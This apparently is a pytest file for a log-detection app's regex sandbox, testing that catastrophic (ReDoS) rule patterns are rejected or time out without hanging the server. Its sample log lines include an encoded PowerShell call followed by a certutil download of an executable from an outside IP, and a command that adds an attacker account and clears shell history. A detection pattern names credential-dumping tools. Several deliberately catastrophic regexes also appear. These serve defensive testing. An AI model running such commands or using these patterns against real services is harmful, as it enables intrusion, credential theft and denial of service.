"""The custom-rule sandbox must survive a catastrophic regex.

The old sandbox ran evaluation in a worker thread and abandoned it on timeout. `re` never releases the GIL
while it backtracks, so the timeout only *reported*: the abandoned thread kept burning a core and the whole
process stalled — one saved rule could hang the server. The fix is two layers:

  1. save time  — `catastrophic_reason()` rejects the classic ReDoS shapes with a 400 that explains why;
  2. eval time  — `SafePattern.search` hands the `regex` module the time left in the pass, and the module
                  aborts the match itself.

Layer 1 is a heuristic and is expected to miss things (`([0-9]|[0-9][0-9])+$` sails straight through it) —
which is exactly why the tests below drive a REAL catastrophic pattern through the engine and assert on the
wall clock, rather than injecting a fake timeout.
"""
from __future__ import annotations

import re
import threading
import time

import pytest
from fastapi.testclient import TestClient

from app import rules as rules_mod
from app.detect import PARAMS
from app.main import app
from app.models import Event, Rule, RuleCondition, RuleFlags
from app.rules import (REGEX_ENGINE, RULE_TIMEOUT_S, RuleError, RulesStore, catastrophic_reason,
                       compile_pattern, screen_pattern)

# A genuinely catastrophic pattern that the save-time screen does NOT catch: the alternatives overlap, but
# they are character classes rather than literals, and deciding that statically needs real automata analysis.
# Perfect subject for layer 2 — and proof that layer 1 alone would not be a fix.
EVIL = r"([0-9]|[0-9][0-9])+$"
EVIL_SUBJECT = "1" * 40 + "x"


@pytest.fixture
def c():
    with TestClient(app) as client:
        yield client


def _blames_the_pattern(msg: str) -> bool:
    """The refusal has to name the PATTERN, not the pool.

    The message used to be "evaluation exceeded 5s (catastrophic pattern?)" for both causes, because
    one 5 s budget covered the whole scan: on a large workspace every custom rule tripped it and the
    analyst was sent to debug a regex that was fine. The per-match guard is what catches real
    backtracking, and it says so.
    """
    m = msg.lower()
    return "took longer than" in m and "backtrack" in m


def _ev(**kw) -> Event:
    base = dict(id="e1", ts="2026-08-11T00:00:00Z", source="nginx.access", sourceId="s1", file="access.log",
                host="edge-lb-01", user="svc_deploy", msg="GET /login 401", sev="info", raw="raw line",
                fields={"http.status": "401"})
    base.update(kw)
    return Event(**base)


# ------------------------------------------------------------------ layer 1: the screen is not trigger-happy
def test_every_builtin_regex_passes_the_screen() -> None:
    """The shipped catalogue must never trip the ReDoS screen — a false positive there would make a
    built-in un-editable (the analyst cannot even save it back unchanged)."""
    checked = 0
    for rid, specs in PARAMS.items():
        for spec in specs:
            if spec.kind != "regex":
                continue
            checked += 1
            assert catastrophic_reason(spec.default) is None, f"{rid}/{spec.key} wrongly flagged"
    assert checked >= 10, "expected the built-ins to expose regex parameters"


def test_builtin_regexes_behave_identically_under_the_regex_module() -> None:
    """`regex` is largely but not perfectly `re`-compatible, so every shipped pattern must compile AND agree
    with `re` on real log text."""
    if REGEX_ENGINE != "regex":
        pytest.skip("the `regex` module is not installed")
    subjects = [
        'GET /login?next=/admin HTTP/1.1" 401 512 "-" "sqlmap/1.7"',
        "Aug 11 03:14:15 bastion-1 sshd[2211]: Failed password for invalid user root from 203.0.113.9",
        r"powershell.exe -enc SQBFAFgA ; certutil.exe -urlcache -split -f http://198.51.100.7/a.exe",
        "COMMAND=/bin/bash ; useradd -m attacker ; history -c ; unset HISTFILE",
        "sudo: pam_unix(sudo:auth): authentication failure; logname=svc user=root",
        "arn:aws:iam::123456789012:user/svc_deploy performed ConsoleLogin from 198.51.100.7",
        "",
    ]
    patterns = [spec.default for specs in PARAMS.values() for spec in specs if spec.kind == "regex"]
    for pat in patterns:
        theirs = compile_pattern(pat, RuleFlags(ignoreCase=True))
        mine = re.compile(pat, re.IGNORECASE)
        for s in subjects:
            a, b = theirs.search(s), mine.search(s)
            assert bool(a) == bool(b), f"{pat!r} disagrees on {s!r}"
            if a and b:
                assert (a.start(), a.end()) == (b.start(), b.end()), f"{pat!r} matched differently on {s!r}"


@pytest.mark.parametrize("pattern", [
    r"Failed password for (invalid user )?\S+ from (\d{1,3}\.){3}\d{1,3}",
    r"(GET|POST|PUT|DELETE) /(api|admin)/\S*",
    r"\b(useradd|adduser)\b.*(new user|name=|:\s+\S+)",
    r"(\d+\s)+done",           # nested quantifier, but the literal separator makes it safe
    r"(\d+,)+\d+",
    r"[A-Za-z0-9+/]{20,}={0,2}",
    r"^(?:ERROR|WARN)\s+\[\w+\]\s+.*$",
    r"(?i)mimikatz|procdump|lsass\.dmp",
    r"user=(?P<user>\S+)\s+status=(?P<status>\d+)",
])
def test_legitimate_patterns_are_not_rejected(pattern: str) -> None:
    assert catastrophic_reason(pattern) is None, f"legitimate pattern rejected: {pattern}"
    screen_pattern(pattern)  # must not raise


@pytest.mark.parametrize("pattern,fragment", [
    (r"(a+)+$", "nested quantifiers"),
    (r"^(\s*\w+)*$", "nested quantifiers"),
    (r"(x+x+)+y", "nested quantifiers"),
    (r"(a|aa)+$", "match the same text"),
    (r"(?:foo|foobar)*!", "match the same text"),
    (r"prefix-(\d+)*-suffix", "nested quantifiers"),
])
def test_catastrophic_shapes_are_rejected_with_a_reason(pattern: str, fragment: str) -> None:
    reason = catastrophic_reason(pattern)
    assert reason and fragment in reason, f"{pattern} → {reason}"
    with pytest.raises(RuleError) as exc:
        screen_pattern(pattern)
    assert "rejected" in str(exc.value) and fragment in str(exc.value)


def test_saving_a_catastrophic_rule_is_a_400_that_says_why(c) -> None:
    r = c.post("/api/rules", json={"name": "evil", "sev": "high", "pattern": r"(a+)+$"})
    assert r.status_code == 400, r.text
    detail = r.json()["detail"]
    assert "nested quantifiers" in detail and "rejected" in detail

    r = c.post("/api/rules", json={"name": "evil cond", "sev": "high", "kind": "conditions",
                                   "conditions": [{"field": "raw", "op": "regex", "value": r"(a|aa)+$"}]})
    assert r.status_code == 400, r.text
    assert "match the same text" in r.json()["detail"]

    # …and a legitimate rule still saves
    ok = c.post("/api/rules", json={"name": "fine", "sev": "low", "pattern": r"Failed password for \S+"})
    assert ok.status_code == 200, ok.text
    c.delete(f"/api/rules/{ok.json()['id']}")


def test_a_builtin_regex_override_cannot_be_made_catastrophic(c) -> None:
    """detect.run_rules matches built-in regex params on bare `re`, so the save-time screen is their only
    guard — and a catastrophic value already on disk must degrade to the shipped regex, not disable the rule."""
    rid = next(r for r, ps in PARAMS.items() if any(p.kind == "regex" for p in ps))
    key = next(p.key for p in PARAMS[rid] if p.kind == "regex")
    shipped = next(p.default for p in PARAMS[rid] if p.kind == "regex")
    listing = c.get("/api/rules").json()
    rows = listing["rules"] if isinstance(listing, dict) else listing
    current = next(x for x in rows if x["id"] == rid)
    r = c.put(f"/api/rules/{rid}", json={"name": current["name"], "description": current["description"],
                                         "sev": current["sev"], "enabled": True, "params": {key: r"(a+)+$"}})
    assert r.status_code == 400 and "nested quantifiers" in r.json()["detail"]

    store = RulesStore()
    store._loaded = True
    store.builtin_overrides[rid] = {"params": {key: r"(a+)+$"}}   # as an older build could have written it
    assert store.detection_params().get(rid, {}).get(key) is None, "must fall back to the shipped regex"
    assert rules_mod._param_value(store.builtin_overrides[rid], rid, next(p for p in PARAMS[rid] if p.key == key)) == shipped


# ------------------------------------------------------------------ layer 2: the deadline actually holds
def test_the_evil_pattern_really_is_catastrophic_and_slips_past_the_screen() -> None:
    """Guard for the test itself: if EVIL ever stops being pathological (or starts being screened out) the
    timeout test below would pass for the wrong reason."""
    assert catastrophic_reason(EVIL) is None, "EVIL must reach the evaluation-time layer to test it"
    if REGEX_ENGINE != "regex":
        pytest.skip("the `regex` module is not installed")
    import regex

    t0 = time.perf_counter()
    with pytest.raises(TimeoutError):
        regex.compile(EVIL).search(EVIL_SUBJECT, timeout=0.5)
    assert time.perf_counter() - t0 >= 0.4, "the engine returned early — the pattern is not catastrophic"


@pytest.mark.skipif(REGEX_ENGINE != "regex",
                    reason="without the `regex` module a runaway match cannot be interrupted (see SANDBOX_NOTE)")
def test_catastrophic_regex_rule_times_out_without_pinning_the_process() -> None:
    """THE test. A real ReDoS pattern, a real event set, no injected timeout.

    It must: return in ~RULE_TIMEOUT_S, flag that one rule, tag nothing with it, leave every other rule
    working, and — the part the old sandbox could not do — actually END the worker thread.
    """
    store = RulesStore()
    store._loaded = True
    events = [_ev(id=f"e{i}", raw=EVIL_SUBJECT, msg=EVIL_SUBJECT) for i in range(60)]
    events.append(_ev(id="clean", raw="Failed password for invalid user root from 203.0.113.9"))

    evil = Rule(id="RULE-EVIL", name="evil", sev="high", kind="regex", pattern=EVIL, field="raw",
                flags=RuleFlags(), enabled=True, builtin=False)
    good = Rule(id="RULE-GOOD", name="good", sev="medium", kind="regex", pattern="Failed password",
                field="raw", flags=RuleFlags(), enabled=True, builtin=False)

    before = threading.active_count()
    t0 = time.perf_counter()
    hits = store.apply_rule(evil, events)
    elapsed = time.perf_counter() - t0

    assert hits == 0
    assert elapsed < RULE_TIMEOUT_S + 3, f"the sandbox took {elapsed:.1f}s — the deadline did not hold"
    assert _blames_the_pattern(store.errors["RULE-EVIL"])
    assert evil.error and "catastrophic" in evil.error
    assert all(d.id != "RULE-EVIL" for e in events for d in e.detections)

    # the runaway thread is GONE, not abandoned: with plain `re` it would still be spinning here
    deadline = time.monotonic() + 5
    while threading.active_count() > before and time.monotonic() < deadline:
        time.sleep(0.05)
    assert threading.active_count() <= before, "the evaluation thread is still running — the process is pinned"

    # every other rule still runs, at full speed, right after
    t1 = time.perf_counter()
    assert store.apply_rule(good, events) == 1
    assert time.perf_counter() - t1 < 2, "the interpreter is still busy with the abandoned match"
    assert [d.id for d in events[-1].detections] == ["RULE-GOOD"]
    assert store.errors.get("RULE-GOOD") is None


@pytest.mark.skipif(REGEX_ENGINE != "regex", reason="requires the `regex` module for a real deadline")
def test_condition_rows_get_the_same_deadline() -> None:
    """A `regex` condition row compiles through the sandbox too — detect.condition_pred uses bare `re`, so
    delegating to it would have left this path unprotected."""
    store = RulesStore()
    store._loaded = True
    events = [_ev(id=f"e{i}", raw=EVIL_SUBJECT) for i in range(40)]
    r = Rule(id="RULE-EVIL-COND", name="evil cond", sev="high", kind="conditions", enabled=True, builtin=False,
             conditions=[RuleCondition(field="raw", op="regex", value=EVIL)])
    t0 = time.perf_counter()
    assert store.apply_rule(r, events) == 0
    assert time.perf_counter() - t0 < RULE_TIMEOUT_S + 3
    assert _blames_the_pattern(store.errors["RULE-EVIL-COND"])
    assert not any(e.detections for e in events)


@pytest.mark.skipif(REGEX_ENGINE != "regex", reason="requires the `regex` module for a real deadline")
def test_a_catastrophic_rule_does_not_stop_the_rest_of_the_pass() -> None:
    """apply_all: the bad rule reports an error, the good ones still produce their normal detections."""
    store = RulesStore()
    store._loaded = True
    now = "2026-08-11T00:00:00Z"
    for body in (dict(id="RULE-A", name="evil", pattern=EVIL), dict(id="RULE-B", name="auth", pattern="Failed password"),
                 dict(id="RULE-C", name="ua", pattern="sqlmap")):
        rid = body.pop("id")
        store.custom[rid] = Rule(id=rid, sev="medium", kind="regex", field="raw", enabled=True, builtin=False,
                                 flags=RuleFlags(), createdAt=now, updatedAt=now, **body)
        store.order.append(rid)
    events = [_ev(id=f"e{i}", raw=EVIL_SUBJECT) for i in range(30)]
    events.append(_ev(id="a", raw="Failed password for root"))
    events.append(_ev(id="b", raw='"sqlmap/1.7"'))

    t0 = time.perf_counter()
    total = store.apply_all(events)
    elapsed = time.perf_counter() - t0

    assert elapsed < RULE_TIMEOUT_S + 4, f"apply_all took {elapsed:.1f}s"
    assert total == 2, "the healthy rules must still produce their detections"
    assert _blames_the_pattern(store.errors["RULE-A"])
    assert store.errors.get("RULE-B") is None and store.errors.get("RULE-C") is None
    assert [d.id for d in events[-2].detections] == ["RULE-B"]
    assert [d.id for d in events[-1].detections] == ["RULE-C"]


@pytest.mark.skipif(REGEX_ENGINE != "regex", reason="requires the `regex` module for a real deadline")
def test_rule_test_endpoint_reports_the_timeout_instead_of_hanging(c) -> None:
    """POST /api/rules/test with a pathological pattern comes back with an error, not a hung request."""
    from app.store import STORE

    with STORE.lock:
        STORE.events = [_ev(id=f"e{i}", raw=EVIL_SUBJECT) for i in range(40)]
    t0 = time.perf_counter()
    r = c.post("/api/rules/test", json={"pattern": EVIL, "field": "raw"})
    elapsed = time.perf_counter() - t0
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["hits"] == 0 and _blames_the_pattern(body.get("error") or "")
    assert elapsed < RULE_TIMEOUT_S + 3, f"the request took {elapsed:.1f}s"
    with STORE.lock:
        STORE.events = []


def test_the_sandbox_reports_which_engine_it_is_using() -> None:
    """Operators need to know when the deadline is real; the fallback must be explicit about what is lost."""
    assert REGEX_ENGINE in ("regex", "re")
    if REGEX_ENGINE == "re":
        assert "cannot be interrupted" in rules_mod.SANDBOX_NOTE
    else:
        assert "inside the match" in rules_mod.SANDBOX_NOTE
